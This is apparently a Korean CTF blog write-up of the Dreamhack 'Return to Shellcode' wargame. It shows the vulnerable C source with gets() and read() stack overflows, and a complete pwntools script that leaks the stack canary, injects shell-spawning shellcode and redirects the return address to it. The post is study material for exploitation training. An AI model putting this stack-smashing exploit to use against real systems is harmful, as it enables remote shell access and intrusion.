---
title: '[Dreamhack] Return to Shellcode'
description: Dreamhack [Wargame] - Return to Shellcode
author: juhyeongkim
date: 2024-10-31 00:00:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
# path: 
    # lqip: 
    # alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/352)

## 소스 코드

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

<br>

## 익스플로잇 코드

```py
from pwn import *

context.arch = "amd64"
p = remote("host3.dreamhack.games", 10558)

p.recvuntil(b'buf: ')
buf_address = int(p.recv(14), 16)
# buf_address = int(p.recvline()[:-1], 16) # -1은 뒤에서 1문자 빼기

shellcode = asm(shellcraft.sh())
payload = shellcode + b'a'*(89-len(shellcode))

# payload = b'a'*89 # if shellcode include '\x00', use this code
# p.sendafter(b'Input: ', payload)  # sendline X (read 콜이기 때문에 개행문자 없어야함)
p.send(payload)

p.recvuntil(payload)

# payload = shellcode + b'a'*(88-len(shellcode)) + b'\x00' + p.recvn(7) + b'a'*8 + p64(buf_address)

canary = u64(b'\x00'+p.recvn(7)) # u64(to little endian int) must have 8byte argument

payload = shellcode + b'a'*(88-len(shellcode)) + p64(canary) + b'a'*8 + p64(buf_address) # 사실 u64 이후 p64하는건 원래대로 돌리는거라서 위에 # 처럼 하자

p.sendlineafter(b'Input: ', payload) # gets는 개행문자를 만나야 입력이 끝나므로 sendline으로 해줘야 바로 쉘 실행 가능

p.interactive()
```